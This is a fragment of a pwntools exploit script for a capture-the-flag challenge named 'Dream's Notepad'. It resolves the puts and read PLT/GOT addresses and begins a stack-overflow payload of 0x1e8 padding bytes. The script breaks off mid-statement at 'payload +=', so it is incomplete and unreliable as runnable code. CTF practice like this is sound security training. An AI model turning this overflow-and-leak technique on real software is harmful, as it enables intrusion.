from pwn import *

rem = process("./Pwnable/Dream's Notepad/problem/Notepad")
elf = ELF("./Pwnable/Dream's Notepad/problem/Notepad")

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_plt = elf.plt['read']
read_got = elf.got['read']

print(hex(puts_plt))
print(hex(puts_got))
print(hex(read_plt))
print(hex(read_got))

rem.sendlineafter(b"-----\n", b"'")

payload = b'A' * 0x1e8
payload += 

